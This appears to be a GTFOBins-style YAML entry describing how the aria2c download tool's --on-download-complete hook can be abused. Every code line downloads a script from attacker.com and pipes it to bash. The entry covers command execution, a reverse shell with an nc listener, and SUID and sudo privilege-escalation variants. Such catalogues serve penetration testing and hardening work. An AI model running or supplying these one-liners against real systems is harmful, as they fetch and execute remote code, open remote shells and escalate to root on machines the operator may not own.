---
functions:
  execute-interactive:
    - description: "By default the ``--on-download-complete`` option execute a given binary with 3 parameters: https://aria2.github.io/manual/en/html/aria2c.html?highlight=download%20complete#event-hook We can control the first one (GID) which leads to a command execution"
    - code: "aria2c --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa # aaaaaaaaaaaaaaaa file contains a shell script"
  reverse-shell-interactive:
    - description: Run ``nc -lvp 12345`` on the attacker box to receive the shell.
    - code: "aria2c --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa # aaaaaaaaaaaaaaaa file contains the reverse shell payload (in bash)"
  suid-enabled:
    - code: "./aria2c --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"
  sudo-enabled:
    - code: "sudo aria2c --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"
---
